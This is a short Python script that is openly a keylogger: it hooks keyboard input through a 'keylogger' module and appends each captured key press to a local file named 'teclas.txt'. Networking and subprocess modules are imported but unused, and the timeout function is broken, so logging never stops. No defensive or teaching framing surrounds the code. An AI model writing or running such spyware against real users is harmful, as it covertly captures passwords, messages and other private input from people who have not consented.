
import keylogger
import urllib
import urllib2
import os
import subprocess
import socket
import time

now = time.time()

def done():
        now + 60

#done = lambda: time.time() > now + 60

def print_keys(t, modifiers, keys):
        a = open("teclas.txt", "a")
        a.write("%r" % keys)

def main():
        keylogger.log(done, print_keys)

main()
